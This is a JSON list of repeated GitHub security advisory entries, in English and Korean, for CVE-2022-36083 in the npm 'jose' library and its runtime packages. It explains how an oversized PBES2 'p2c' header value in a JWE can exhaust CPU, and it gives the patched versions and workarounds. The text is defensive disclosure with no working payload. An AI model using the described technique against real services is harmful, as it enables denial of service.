    "description": "The PBKDF2-based JWE key management algorithms expect a JOSE Header Parameter named `p2c` ([PBES2 Count](https://www.rfc-editor.org/rfc/rfc7518.html#section-4.8.1.2)), which determines how many PBKDF2 iterations must be executed in order to derive a CEK wrapping key. The purpose of this parameter is to intentionally slow down the key derivation function in order to make password brute-force and dictionary attacks more expensive.\n\nThis makes the PBES2 algorithms unsuitable for situations where the JWE is coming from an untrusted source: an adversary can intentionally pick an extremely high PBES2 Count value, that will initiate a CPU-bound computation that may take an unreasonable amount of time to finish.\n\n### Impact\n\nUnder certain conditions (see below) it is possible to have the user's environment consume unreasonable amount of CPU time.\n\n### Affected users\n\nThe impact is limited only to users utilizing the JWE decryption APIs with symmetric secrets to decrypt JWEs from untrusted parties who do not limit the accepted JWE Key Management Algorithms (`alg` Header Parameter) using the `keyManagementAlgorithms` (or `algorithms` in v1.x) decryption option or through other means.\n\nThe PBKDF2-based JWE Key Management Algorithm Identifiers are\n\n- `PBES2-HS256+A128KW`\n- `PBES2-HS384+A192KW`\n- `PBES2-HS512+A256KW`\n\ne.g.\n\n```js\nconst secret = new Uint8Array(16)\nconst jwe = '...' // JWE from an untrusted party\n\nawait jose.compactDecrypt(jwe, secret)\n```\n\nYou are NOT affected if any of the following applies to you\n\n- Your code does not use the JWE APIs\n- Your code only produces JWE tokens\n- Your code only decrypts JWEs using an asymmetric JWE Key Management Algorithm (this means you're providing an asymmetric key object to the JWE decryption API)\n- Your code only accepts JWEs produced by trusted sources\n- Your code limits the accepted JWE Key Management Algorithms using the `keyManagementAlgorithms` decryption option not including any of the PBKDF2-based JWE key management algorithms\n\n### Patches\n\n`v1.28.2`, `v2.0.6`, `v3.20.4`, and `v4.9.2` releases limit the maximum PBKDF2 iteration count to `10000` by default. It is possible to adjust this limit with a newly introduced `maxPBES2Count` decryption option.\n\n### Workarounds\n\nAll users should be able to upgrade given all stable semver major release lines have had new a patch release introduced which limits the PBKDF2 iteration count to `10000` by default. This removes the ability to craft JWEs that would consume unreasonable amount of CPU time.\n\nIf users are unable to upgrade their required library version they have two options depending on whether they expect to receive JWEs using any of the three PBKDF2-based JWE key management algorithms.\n\n- they can use the `keyManagementAlgorithms` decryption option to disable accepting PBKDF2 altogether\n- they can inspect the JOSE Header prior to using the decryption API and limit the PBKDF2 iteration count (`p2c` Header Parameter)\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an discussion in the project's [repository](https://github.com/panva/jose/discussions/new?category=q-a&title=GHSA-jv3g-j58f-9mq9%20advisory%20question)\n* Email me at [panva.ip@gmail.com](mailto:panva.ip@gmail.com)\n",
    "identifiers": "GHSA : GHSA-jv3g-j58f-9mq9\nCVE : CVE-2022-36083",
    "severity": "MODERATE",
    "updatedAt": "2023-07-21T21:33:36Z",
    "publishedAt": "2022-09-16T17:44:42Z",
    "references": "https://github.com/panva/jose/security/advisories/GHSA-jv3g-j58f-9mq9\nhttps://nvd.nist.gov/vuln/detail/CVE-2022-36083\nhttps://github.com/panva/jose/commit/03d6d013bf6e070e85adfe5731f526978e3e8e4d\nhttps://github.com/panva/jose/releases/tag/v4.9.2\nhttps://github.com/advisories/GHSA-jv3g-j58f-9mq9",
    "name": "jose",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 2.0.0, <= 2.0.5",
    "identifier": "2.0.6",
    "descriptionKR": "PBKDF2 기반 JWE 키 관리 알고리즘은 'p2c'([PBES2 개수](https://www.rfc-editor.org/rfc/rfc7518.html#section-4.8.1.2))라는 JOSE 헤더 매개변수를 예상합니다. CEK 래핑 키를 파생시키기 위해 실행해야 하는 PBKDF2 반복 횟수를 결정합니다. 이 매개변수의 목적은 의도적으로 키 파생 기능을 느리게 하여 암호 무차별 대입 공격과 사전 공격의 비용을 높이는 것입니다.\n\n이로 인해 PBES2 알고리즘은 JWE가 신뢰할 수 없는 소스에서 오는 상황에 부적합합니다. 공격자는 의도적으로 매우 높은 PBES2 카운트 값을 선택할 수 있으며, 이 값은 완료하는 데 비합리적인 시간이 걸릴 수 있는 CPU 바운드 계산을 시작합니다.\n\n### 영향\n\n특정 조건(아래 참조)에서 사용자 환경이 비합리적인 양의 CPU 시간을 소비하도록 할 수 있습니다.\n\n### 영향을 받는 사용자\n\n영향은 'keyManagementAlgorithms'(또는 v1의 'algorithms')를 사용하여 허용된 JWE 키 관리 알고리즘('alg' 헤더 매개변수)을 제한하지 않는 신뢰할 수 없는 당사자로부터 JWE를 해독하기 위해 대칭 비밀이 있는 JWE 암호 해독 API를 사용하는 사용자에게만 제한됩니다. .x) 암호 해독 옵션 또는 기타 수단을 통해.\n\nPBKDF2 기반 JWE 키 관리 알고리즘 식별자는 다음과 같습니다.\n\n- `PBES2-HS256+A128KW`\n- `PBES2-HS384+A192KW`\n- `PBES2-HS512+A256KW`\n\n예를 들어\n\n```js\nconst secret = new Uint8Array(16)\nconst jwe = '...' // 신뢰할 수 없는 당사자의 JWE\n\nawait jose.compactDecrypt(jwe, 비밀)\n```\n\n다음 중 하나라도 해당되는 경우 영향을 받지 않습니다.\n\n- 귀하의 코드는 JWE API를 사용하지 않습니다.\n- 귀하의 코드는 JWE 토큰만 생성합니다.\n- 귀하의 코드는 비대칭 JWE 키 관리 알고리즘을 사용하여 JWE만 해독합니다(즉, JWE 해독 API에 비대칭 키 객체를 제공한다는 의미입니다).\n- 귀하의 코드는 신뢰할 수 있는 소스에서 생성된 JWE만 허용합니다.\n- 귀하의 코드는 PBKDF2 기반 JWE 키 관리 알고리즘을 포함하지 않는 'keyManagementAlgorithms' 암호 해독 옵션을 사용하여 허용되는 JWE 키 관리 알고리즘을 제한합니다.\n\n### 패치\n\n`v1.28.2`, `v2.0.6`, `v3.20.4` 및 `v4.9.2` 릴리스는 기본적으로 최대 PBKDF2 반복 횟수를 `10000`으로 제한합니다. 새로 도입된 'maxPBES2Count' 복호화 옵션으로 이 제한을 조정할 수 있습니다.\n\n### 해결 방법\n\n모든 안정적인 semver 주요 릴리스 라인에 기본적으로 PBKDF2 반복 횟수를 '10000'으로 제한하는 새로운 패치 릴리스가 도입된 경우 모든 사용자가 업그레이드할 수 있어야 합니다. 이렇게 하면 부당한 양의 CPU 시간을 소비하는 JWE를 만드는 기능이 제거됩니다.\n\n사용자가 필요한 라이브러리 버전을 업그레이드할 수 없는 경우 세 가지 PBKDF2 기반 JWE 키 관리 알고리즘 중 하나를 사용하여 JWE를 수신할지 여부에 따라 두 가지 옵션이 있습니다.\n\n- `keyManagementAlgorithms` 암호 해독 옵션을 사용하여 PBKDF2 수락을 완전히 비활성화할 수 있습니다.\n- 암호 해독 API를 사용하기 전에 JOSE 헤더를 검사하고 PBKDF2 반복 횟수(`p2c` 헤더 매개변수)를 제한할 수 있습니다.\n\n### 자세한 내용은\n이 권고에 대한 질문이나 의견이 있는 경우:\n* 프로젝트의 [저장소](https://github.com/panva/jose/discussions/new?category=q-a&title=GHSA-jv3g-j58f-9mq9%20advisory%20question)에서 토론 열기\n* [panva.ip@gmail.com](mailto:panva.ip@gmail.com)으로 이메일을 보내주세요."
  },
  {
    "description": "The PBKDF2-based JWE key management algorithms expect a JOSE Header Parameter named `p2c` ([PBES2 Count](https://www.rfc-editor.org/rfc/rfc7518.html#section-4.8.1.2)), which determines how many PBKDF2 iterations must be executed in order to derive a CEK wrapping key. The purpose of this parameter is to intentionally slow down the key derivation function in order to make password brute-force and dictionary attacks more expensive.\n\nThis makes the PBES2 algorithms unsuitable for situations where the JWE is coming from an untrusted source: an adversary can intentionally pick an extremely high PBES2 Count value, that will initiate a CPU-bound computation that may take an unreasonable amount of time to finish.\n\n### Impact\n\nUnder certain conditions (see below) it is possible to have the user's environment consume unreasonable amount of CPU time.\n\n### Affected users\n\nThe impact is limited only to users utilizing the JWE decryption APIs with symmetric secrets to decrypt JWEs from untrusted parties who do not limit the accepted JWE Key Management Algorithms (`alg` Header Parameter) using the `keyManagementAlgorithms` (or `algorithms` in v1.x) decryption option or through other means.\n\nThe PBKDF2-based JWE Key Management Algorithm Identifiers are\n\n- `PBES2-HS256+A128KW`\n- `PBES2-HS384+A192KW`\n- `PBES2-HS512+A256KW`\n\ne.g.\n\n```js\nconst secret = new Uint8Array(16)\nconst jwe = '...' // JWE from an untrusted party\n\nawait jose.compactDecrypt(jwe, secret)\n```\n\nYou are NOT affected if any of the following applies to you\n\n- Your code does not use the JWE APIs\n- Your code only produces JWE tokens\n- Your code only decrypts JWEs using an asymmetric JWE Key Management Algorithm (this means you're providing an asymmetric key object to the JWE decryption API)\n- Your code only accepts JWEs produced by trusted sources\n- Your code limits the accepted JWE Key Management Algorithms using the `keyManagementAlgorithms` decryption option not including any of the PBKDF2-based JWE key management algorithms\n\n### Patches\n\n`v1.28.2`, `v2.0.6`, `v3.20.4`, and `v4.9.2` releases limit the maximum PBKDF2 iteration count to `10000` by default. It is possible to adjust this limit with a newly introduced `maxPBES2Count` decryption option.\n\n### Workarounds\n\nAll users should be able to upgrade given all stable semver major release lines have had new a patch release introduced which limits the PBKDF2 iteration count to `10000` by default. This removes the ability to craft JWEs that would consume unreasonable amount of CPU time.\n\nIf users are unable to upgrade their required library version they have two options depending on whether they expect to receive JWEs using any of the three PBKDF2-based JWE key management algorithms.\n\n- they can use the `keyManagementAlgorithms` decryption option to disable accepting PBKDF2 altogether\n- they can inspect the JOSE Header prior to using the decryption API and limit the PBKDF2 iteration count (`p2c` Header Parameter)\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an discussion in the project's [repository](https://github.com/panva/jose/discussions/new?category=q-a&title=GHSA-jv3g-j58f-9mq9%20advisory%20question)\n* Email me at [panva.ip@gmail.com](mailto:panva.ip@gmail.com)\n",
    "identifiers": "GHSA : GHSA-jv3g-j58f-9mq9\nCVE : CVE-2022-36083",
    "severity": "MODERATE",
    "updatedAt": "2023-07-21T21:33:36Z",
    "publishedAt": "2022-09-16T17:44:42Z",
    "references": "https://github.com/panva/jose/security/advisories/GHSA-jv3g-j58f-9mq9\nhttps://nvd.nist.gov/vuln/detail/CVE-2022-36083\nhttps://github.com/panva/jose/commit/03d6d013bf6e070e85adfe5731f526978e3e8e4d\nhttps://github.com/panva/jose/releases/tag/v4.9.2\nhttps://github.com/advisories/GHSA-jv3g-j58f-9mq9",
    "name": "jose-node-esm-runtime",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 3.0.0, <= 3.20.3",
    "identifier": "3.20.4",
    "descriptionKR": "PBKDF2 기반 JWE 키 관리 알고리즘은 'p2c'([PBES2 개수](https://www.rfc-editor.org/rfc/rfc7518.html#section-4.8.1.2))라는 JOSE 헤더 매개변수를 예상합니다. CEK 래핑 키를 파생시키기 위해 실행해야 하는 PBKDF2 반복 횟수를 결정합니다. 이 매개변수의 목적은 의도적으로 키 파생 기능을 느리게 하여 암호 무차별 대입 공격과 사전 공격의 비용을 높이는 것입니다.\n\n이로 인해 PBES2 알고리즘은 JWE가 신뢰할 수 없는 소스에서 오는 상황에 부적합합니다. 공격자는 의도적으로 매우 높은 PBES2 카운트 값을 선택할 수 있으며, 이 값은 완료하는 데 비합리적인 시간이 걸릴 수 있는 CPU 바운드 계산을 시작합니다.\n\n### 영향\n\n특정 조건(아래 참조)에서 사용자 환경이 비합리적인 양의 CPU 시간을 소비하도록 할 수 있습니다.\n\n### 영향을 받는 사용자\n\n영향은 'keyManagementAlgorithms'(또는 v1의 'algorithms')를 사용하여 허용된 JWE 키 관리 알고리즘('alg' 헤더 매개변수)을 제한하지 않는 신뢰할 수 없는 당사자로부터 JWE를 해독하기 위해 대칭 비밀이 있는 JWE 암호 해독 API를 사용하는 사용자에게만 제한됩니다. .x) 암호 해독 옵션 또는 기타 수단을 통해.\n\nPBKDF2 기반 JWE 키 관리 알고리즘 식별자는 다음과 같습니다.\n\n- `PBES2-HS256+A128KW`\n- `PBES2-HS384+A192KW`\n- `PBES2-HS512+A256KW`\n\n예를 들어\n\n```js\nconst secret = new Uint8Array(16)\nconst jwe = '...' // 신뢰할 수 없는 당사자의 JWE\n\nawait jose.compactDecrypt(jwe, 비밀)\n```\n\n다음 중 하나라도 해당되는 경우 영향을 받지 않습니다.\n\n- 귀하의 코드는 JWE API를 사용하지 않습니다.\n- 귀하의 코드는 JWE 토큰만 생성합니다.\n- 귀하의 코드는 비대칭 JWE 키 관리 알고리즘을 사용하여 JWE만 해독합니다(즉, JWE 해독 API에 비대칭 키 객체를 제공한다는 의미입니다).\n- 귀하의 코드는 신뢰할 수 있는 소스에서 생성된 JWE만 허용합니다.\n- 귀하의 코드는 PBKDF2 기반 JWE 키 관리 알고리즘을 포함하지 않는 'keyManagementAlgorithms' 암호 해독 옵션을 사용하여 허용되는 JWE 키 관리 알고리즘을 제한합니다.\n\n### 패치\n\n`v1.28.2`, `v2.0.6`, `v3.20.4` 및 `v4.9.2` 릴리스는 기본적으로 최대 PBKDF2 반복 횟수를 `10000`으로 제한합니다. 새로 도입된 'maxPBES2Count' 복호화 옵션으로 이 제한을 조정할 수 있습니다.\n\n### 해결 방법\n\n모든 안정적인 semver 주요 릴리스 라인에 기본적으로 PBKDF2 반복 횟수를 '10000'으로 제한하는 새로운 패치 릴리스가 도입된 경우 모든 사용자가 업그레이드할 수 있어야 합니다. 이렇게 하면 부당한 양의 CPU 시간을 소비하는 JWE를 만드는 기능이 제거됩니다.\n\n사용자가 필요한 라이브러리 버전을 업그레이드할 수 없는 경우 세 가지 PBKDF2 기반 JWE 키 관리 알고리즘 중 하나를 사용하여 JWE를 수신할지 여부에 따라 두 가지 옵션이 있습니다.\n\n- `keyManagementAlgorithms` 암호 해독 옵션을 사용하여 PBKDF2 수락을 완전히 비활성화할 수 있습니다.\n- 암호 해독 API를 사용하기 전에 JOSE 헤더를 검사하고 PBKDF2 반복 횟수(`p2c` 헤더 매개변수)를 제한할 수 있습니다.\n\n### 자세한 내용은\n이 권고에 대한 질문이나 의견이 있는 경우:\n* 프로젝트의 [저장소](https://github.com/panva/jose/discussions/new?category=q-a&title=GHSA-jv3g-j58f-9mq9%20advisory%20question)에서 토론 열기\n* [panva.ip@gmail.com](mailto:panva.ip@gmail.com)으로 이메일을 보내주세요."
  },
  {
    "description": "The PBKDF2-based JWE key management algorithms expect a JOSE Header Parameter named `p2c` ([PBES2 Count](https://www.rfc-editor.org/rfc/rfc7518.html#section-4.8.1.2)), which determines how many PBKDF2 iterations must be executed in order to derive a CEK wrapping key. The purpose of this parameter is to intentionally slow down the key derivation function in order to make password brute-force and dictionary attacks more expensive.\n\nThis makes the PBES2 algorithms unsuitable for situations where the JWE is coming from an untrusted source: an adversary can intentionally pick an extremely high PBES2 Count value, that will initiate a CPU-bound computation that may take an unreasonable amount of time to finish.\n\n### Impact\n\nUnder certain conditions (see below) it is possible to have the user's environment consume unreasonable amount of CPU time.\n\n### Affected users\n\nThe impact is limited only to users utilizing the JWE decryption APIs with symmetric secrets to decrypt JWEs from untrusted parties who do not limit the accepted JWE Key Management Algorithms (`alg` Header Parameter) using the `keyManagementAlgorithms` (or `algorithms` in v1.x) decryption option or through other means.\n\nThe PBKDF2-based JWE Key Management Algorithm Identifiers are\n\n- `PBES2-HS256+A128KW`\n- `PBES2-HS384+A192KW`\n- `PBES2-HS512+A256KW`\n\ne.g.\n\n```js\nconst secret = new Uint8Array(16)\nconst jwe = '...' // JWE from an untrusted party\n\nawait jose.compactDecrypt(jwe, secret)\n```\n\nYou are NOT affected if any of the following applies to you\n\n- Your code does not use the JWE APIs\n- Your code only produces JWE tokens\n- Your code only decrypts JWEs using an asymmetric JWE Key Management Algorithm (this means you're providing an asymmetric key object to the JWE decryption API)\n- Your code only accepts JWEs produced by trusted sources\n- Your code limits the accepted JWE Key Management Algorithms using the `keyManagementAlgorithms` decryption option not including any of the PBKDF2-based JWE key management algorithms\n\n### Patches\n\n`v1.28.2`, `v2.0.6`, `v3.20.4`, and `v4.9.2` releases limit the maximum PBKDF2 iteration count to `10000` by default. It is possible to adjust this limit with a newly introduced `maxPBES2Count` decryption option.\n\n### Workarounds\n\nAll users should be able to upgrade given all stable semver major release lines have had new a patch release introduced which limits the PBKDF2 iteration count to `10000` by default. This removes the ability to craft JWEs that would consume unreasonable amount of CPU time.\n\nIf users are unable to upgrade their required library version they have two options depending on whether they expect to receive JWEs using any of the three PBKDF2-based JWE key management algorithms.\n\n- they can use the `keyManagementAlgorithms` decryption option to disable accepting PBKDF2 altogether\n- they can inspect the JOSE Header prior to using the decryption API and limit the PBKDF2 iteration count (`p2c` Header Parameter)\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an discussion in the project's [repository](https://github.com/panva/jose/discussions/new?category=q-a&title=GHSA-jv3g-j58f-9mq9%20advisory%20question)\n* Email me at [panva.ip@gmail.com](mailto:panva.ip@gmail.com)\n",
    "identifiers": "GHSA : GHSA-jv3g-j58f-9mq9\nCVE : CVE-2022-36083",
    "severity": "MODERATE",
    "updatedAt": "2023-07-21T21:33:36Z",
    "publishedAt": "2022-09-16T17:44:42Z",
    "references": "https://github.com/panva/jose/security/advisories/GHSA-jv3g-j58f-9mq9\nhttps://nvd.nist.gov/vuln/detail/CVE-2022-36083\nhttps://github.com/panva/jose/commit/03d6d013bf6e070e85adfe5731f526978e3e8e4d\nhttps://github.com/panva/jose/releases/tag/v4.9.2\nhttps://github.com/advisories/GHSA-jv3g-j58f-9mq9",
    "name": "jose-node-cjs-runtime",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 3.0.0, <= 3.20.3",
    "identifier": "3.20.4",
    "descriptionKR": "PBKDF2 기반 JWE 키 관리 알고리즘은 'p2c'([PBES2 개수](https://www.rfc-editor.org/rfc/rfc7518.html#section-4.8.1.2))라는 JOSE 헤더 매개변수를 예상합니다. CEK 래핑 키를 파생시키기 위해 실행해야 하는 PBKDF2 반복 횟수를 결정합니다. 이 매개변수의 목적은 의도적으로 키 파생 기능을 느리게 하여 암호 무차별 대입 공격과 사전 공격의 비용을 높이는 것입니다.\n\n이로 인해 PBES2 알고리즘은 JWE가 신뢰할 수 없는 소스에서 오는 상황에 부적합합니다. 공격자는 의도적으로 매우 높은 PBES2 카운트 값을 선택할 수 있으며, 이 값은 완료하는 데 비합리적인 시간이 걸릴 수 있는 CPU 바운드 계산을 시작합니다.\n\n### 영향\n\n특정 조건(아래 참조)에서 사용자 환경이 비합리적인 양의 CPU 시간을 소비하도록 할 수 있습니다.\n\n### 영향을 받는 사용자\n\n영향은 'keyManagementAlgorithms'(또는 v1의 'algorithms')를 사용하여 허용된 JWE 키 관리 알고리즘('alg' 헤더 매개변수)을 제한하지 않는 신뢰할 수 없는 당사자로부터 JWE를 해독하기 위해 대칭 비밀이 있는 JWE 암호 해독 API를 사용하는 사용자에게만 제한됩니다. .x) 암호 해독 옵션 또는 기타 수단을 통해.\n\nPBKDF2 기반 JWE 키 관리 알고리즘 식별자는 다음과 같습니다.\n\n- `PBES2-HS256+A128KW`\n- `PBES2-HS384+A192KW`\n- `PBES2-HS512+A256KW`\n\n예를 들어\n\n```js\nconst secret = new Uint8Array(16)\nconst jwe = '...' // 신뢰할 수 없는 당사자의 JWE\n\nawait jose.compactDecrypt(jwe, 비밀)\n```\n\n다음 중 하나라도 해당되는 경우 영향을 받지 않습니다.\n\n- 귀하의 코드는 JWE API를 사용하지 않습니다.\n- 귀하의 코드는 JWE 토큰만 생성합니다.\n- 귀하의 코드는 비대칭 JWE 키 관리 알고리즘을 사용하여 JWE만 해독합니다(즉, JWE 해독 API에 비대칭 키 객체를 제공한다는 의미입니다).\n- 귀하의 코드는 신뢰할 수 있는 소스에서 생성된 JWE만 허용합니다.\n- 귀하의 코드는 PBKDF2 기반 JWE 키 관리 알고리즘을 포함하지 않는 'keyManagementAlgorithms' 암호 해독 옵션을 사용하여 허용되는 JWE 키 관리 알고리즘을 제한합니다.\n\n### 패치\n\n`v1.28.2`, `v2.0.6`, `v3.20.4` 및 `v4.9.2` 릴리스는 기본적으로 최대 PBKDF2 반복 횟수를 `10000`으로 제한합니다. 새로 도입된 'maxPBES2Count' 복호화 옵션으로 이 제한을 조정할 수 있습니다.\n\n### 해결 방법\n\n모든 안정적인 semver 주요 릴리스 라인에 기본적으로 PBKDF2 반복 횟수를 '10000'으로 제한하는 새로운 패치 릴리스가 도입된 경우 모든 사용자가 업그레이드할 수 있어야 합니다. 이렇게 하면 부당한 양의 CPU 시간을 소비하는 JWE를 만드는 기능이 제거됩니다.\n\n사용자가 필요한 라이브러리 버전을 업그레이드할 수 없는 경우 세 가지 PBKDF2 기반 JWE 키 관리 알고리즘 중 하나를 사용하여 JWE를 수신할지 여부에 따라 두 가지 옵션이 있습니다.\n\n- `keyManagementAlgorithms` 암호 해독 옵션을 사용하여 PBKDF2 수락을 완전히 비활성화할 수 있습니다.\n- 암호 해독 API를 사용하기 전에 JOSE 헤더를 검사하고 PBKDF2 반복 횟수(`p2c` 헤더 매개변수)를 제한할 수 있습니다.\n\n### 자세한 내용은\n이 권고에 대한 질문이나 의견이 있는 경우:\n* 프로젝트의 [저장소](https://github.com/panva/jose/discussions/new?category=q-a&title=GHSA-jv3g-j58f-9mq9%20advisory%20question)에서 토론 열기\n* [panva.ip@gmail.com](mailto:panva.ip@gmail.com)으로 이메일을 보내주세요."
  },
  {
    "description": "The PBKDF2-based JWE key management algorithms expect a JOSE Header Parameter named `p2c` ([PBES2 Count](https://www.rfc-editor.org/rfc/rfc7518.html#section-4.8.1.2)), which determines how many PBKDF2 iterations must be executed in order to derive a CEK wrapping key. The purpose of this parameter is to intentionally slow down the key derivation function in order to make password brute-force and dictionary attacks more expensive.\n\nThis makes the PBES2 algorithms unsuitable for situations where the JWE is coming from an untrusted source: an adversary can intentionally pick an extremely high PBES2 Count value, that will initiate a CPU-bound computation that may take an unreasonable amount of time to finish.\n\n### Impact\n\nUnder certain conditions (see below) it is possible to have the user's environment consume unreasonable amount of CPU time.\n\n### Affected users\n\nThe impact is limited only to users utilizing the JWE decryption APIs with symmetric secrets to decrypt JWEs from untrusted parties who do not limit the accepted JWE Key Management Algorithms (`alg` Header Parameter) using the `keyManagementAlgorithms` (or `algorithms` in v1.x) decryption option or through other means.\n\nThe PBKDF2-based JWE Key Management Algorithm Identifiers are\n\n- `PBES2-HS256+A128KW`\n- `PBES2-HS384+A192KW`\n- `PBES2-HS512+A256KW`\n\ne.g.\n\n```js\nconst secret = new Uint8Array(16)\nconst jwe = '...' // JWE from an untrusted party\n\nawait jose.compactDecrypt(jwe, secret)\n```\n\nYou are NOT affected if any of the following applies to you\n\n- Your code does not use the JWE APIs\n- Your code only produces JWE tokens\n- Your code only decrypts JWEs using an asymmetric JWE Key Management Algorithm (this means you're providing an asymmetric key object to the JWE decryption API)\n- Your code only accepts JWEs produced by trusted sources\n- Your code limits the accepted JWE Key Management Algorithms using the `keyManagementAlgorithms` decryption option not including any of the PBKDF2-based JWE key management algorithms\n\n### Patches\n\n`v1.28.2`, `v2.0.6`, `v3.20.4`, and `v4.9.2` releases limit the maximum PBKDF2 iteration count to `10000` by default. It is possible to adjust this limit with a newly introduced `maxPBES2Count` decryption option.\n\n### Workarounds\n\nAll users should be able to upgrade given all stable semver major release lines have had new a patch release introduced which limits the PBKDF2 iteration count to `10000` by default. This removes the ability to craft JWEs that would consume unreasonable amount of CPU time.\n\nIf users are unable to upgrade their required library version they have two options depending on whether they expect to receive JWEs using any of the three PBKDF2-based JWE key management algorithms.\n\n- they can use the `keyManagementAlgorithms` decryption option to disable accepting PBKDF2 altogether\n- they can inspect the JOSE Header prior to using the decryption API and limit the PBKDF2 iteration count (`p2c` Header Parameter)\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an discussion in the project's [repository](https://github.com/panva/jose/discussions/new?category=q-a&title=GHSA-jv3g-j58f-9mq9%20advisory%20question)\n* Email me at [panva.ip@gmail.com](mailto:panva.ip@gmail.com)\n",
    "identifiers": "GHSA : GHSA-jv3g-j58f-9mq9\nCVE : CVE-2022-36083",
    "severity": "MODERATE",
    "updatedAt": "2023-07-21T21:33:36Z",
    "publishedAt": "2022-09-16T17:44:42Z",
    "references": "https://github.com/panva/jose/security/advisories/GHSA-jv3g-j58f-9mq9\nhttps://nvd.nist.gov/vuln/detail/CVE-2022-36083\nhttps://github.com/panva/jose/commit/03d6d013bf6e070e85adfe5731f526978e3e8e4d\nhttps://github.com/panva/jose/releases/tag/v4.9.2\nhttps://github.com/advisories/GHSA-jv3g-j58f-9mq9",
    "name": "jose-browser-runtime",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 3.0.0, <= 3.20.3",
    "identifier": "3.20.4",
    "descriptionKR": "PBKDF2 기반 JWE 키 관리 알고리즘은 'p2c'([PBES2 개수](https://www.rfc-editor.org/rfc/rfc7518.html#section-4.8.1.2))라는 JOSE 헤더 매개변수를 예상합니다. CEK 래핑 키를 파생시키기 위해 실행해야 하는 PBKDF2 반복 횟수를 결정합니다. 이 매개변수의 목적은 의도적으로 키 파생 기능을 느리게 하여 암호 무차별 대입 공격과 사전 공격의 비용을 높이는 것입니다.\n\n이로 인해 PBES2 알고리즘은 JWE가 신뢰할 수 없는 소스에서 오는 상황에 부적합합니다. 공격자는 의도적으로 매우 높은 PBES2 카운트 값을 선택할 수 있으며, 이 값은 완료하는 데 비합리적인 시간이 걸릴 수 있는 CPU 바운드 계산을 시작합니다.\n\n### 영향\n\n특정 조건(아래 참조)에서 사용자 환경이 비합리적인 양의 CPU 시간을 소비하도록 할 수 있습니다.\n\n### 영향을 받는 사용자\n\n영향은 'keyManagementAlgorithms'(또는 v1의 'algorithms')를 사용하여 허용된 JWE 키 관리 알고리즘('alg' 헤더 매개변수)을 제한하지 않는 신뢰할 수 없는 당사자로부터 JWE를 해독하기 위해 대칭 비밀이 있는 JWE 암호 해독 API를 사용하는 사용자에게만 제한됩니다. .x) 암호 해독 옵션 또는 기타 수단을 통해.\n\nPBKDF2 기반 JWE 키 관리 알고리즘 식별자는 다음과 같습니다.\n\n- `PBES2-HS256+A128KW`\n- `PBES2-HS384+A192KW`\n- `PBES2-HS512+A256KW`\n\n예를 들어\n\n```js\nconst secret = new Uint8Array(16)\nconst jwe = '...' // 신뢰할 수 없는 당사자의 JWE\n\nawait jose.compactDecrypt(jwe, 비밀)\n```\n\n다음 중 하나라도 해당되는 경우 영향을 받지 않습니다.\n\n- 귀하의 코드는 JWE API를 사용하지 않습니다.\n- 귀하의 코드는 JWE 토큰만 생성합니다.\n- 귀하의 코드는 비대칭 JWE 키 관리 알고리즘을 사용하여 JWE만 해독합니다(즉, JWE 해독 API에 비대칭 키 객체를 제공한다는 의미입니다).\n- 귀하의 코드는 신뢰할 수 있는 소스에서 생성된 JWE만 허용합니다.\n- 귀하의 코드는 PBKDF2 기반 JWE 키 관리 알고리즘을 포함하지 않는 'keyManagementAlgorithms' 암호 해독 옵션을 사용하여 허용되는 JWE 키 관리 알고리즘을 제한합니다.\n\n### 패치\n\n`v1.28.2`, `v2.0.6`, `v3.20.4` 및 `v4.9.2` 릴리스는 기본적으로 최대 PBKDF2 반복 횟수를 `10000`으로 제한합니다. 새로 도입된 'maxPBES2Count' 복호화 옵션으로 이 제한을 조정할 수 있습니다.\n\n### 해결 방법\n\n모든 안정적인 semver 주요 릴리스 라인에 기본적으로 PBKDF2 반복 횟수를 '10000'으로 제한하는 새로운 패치 릴리스가 도입된 경우 모든 사용자가 업그레이드할 수 있어야 합니다. 이렇게 하면 부당한 양의 CPU 시간을 소비하는 JWE를 만드는 기능이 제거됩니다.\n\n사용자가 필요한 라이브러리 버전을 업그레이드할 수 없는 경우 세 가지 PBKDF2 기반 JWE 키 관리 알고리즘 중 하나를 사용하여 JWE를 수신할지 여부에 따라 두 가지 옵션이 있습니다.\n\n- `keyManagementAlgorithms` 암호 해독 옵션을 사용하여 PBKDF2 수락을 완전히 비활성화할 수 있습니다.\n- 암호 해독 API를 사용하기 전에 JOSE 헤더를 검사하고 PBKDF2 반복 횟수(`p2c` 헤더 매개변수)를 제한할 수 있습니다.\n\n### 자세한 내용은\n이 권고에 대한 질문이나 의견이 있는 경우:\n* 프로젝트의 [저장소](https://github.com/panva/jose/discussions/new?category=q-a&title=GHSA-jv3g-j58f-9mq9%20advisory%20question)에서 토론 열기\n* [panva.ip@gmail.com](mailto:panva.ip@gmail.com)으로 이메일을 보내주세요."
  },
  {
    "description": "The PBKDF2-based JWE key management algorithms expect a JOSE Header Parameter named `p2c` ([PBES2 Count](https://www.rfc-editor.org/rfc/rfc7518.html#section-4.8.1.2)), which determines how many PBKDF2 iterations must be executed in order to derive a CEK wrapping key. The purpose of this parameter is to intentionally slow down the key derivation function in order to make password brute-force and dictionary attacks more expensive.\n\nThis makes the PBES2 algorithms unsuitable for situations where the JWE is coming from an untrusted source: an adversary can intentionally pick an extremely high PBES2 Count value, that will initiate a CPU-bound computation that may take an unreasonable amount of time to finish.\n\n### Impact\n\nUnder certain conditions (see below) it is possible to have the user's environment consume unreasonable amount of CPU time.\n\n### Affected users\n\nThe impact is limited only to users utilizing the JWE decryption APIs with symmetric secrets to decrypt JWEs from untrusted parties who do not limit the accepted JWE Key Management Algorithms (`alg` Header Parameter) using the `keyManagementAlgorithms` (or `algorithms` in v1.x) decryption option or through other means.\n\nThe PBKDF2-based JWE Key Management Algorithm Identifiers are\n\n- `PBES2-HS256+A128KW`\n- `PBES2-HS384+A192KW`\n- `PBES2-HS512+A256KW`\n\ne.g.\n\n```js\nconst secret = new Uint8Array(16)\nconst jwe = '...' // JWE from an untrusted party\n\nawait jose.compactDecrypt(jwe, secret)\n```\n\nYou are NOT affected if any of the following applies to you\n\n- Your code does not use the JWE APIs\n- Your code only produces JWE tokens\n- Your code only decrypts JWEs using an asymmetric JWE Key Management Algorithm (this means you're providing an asymmetric key object to the 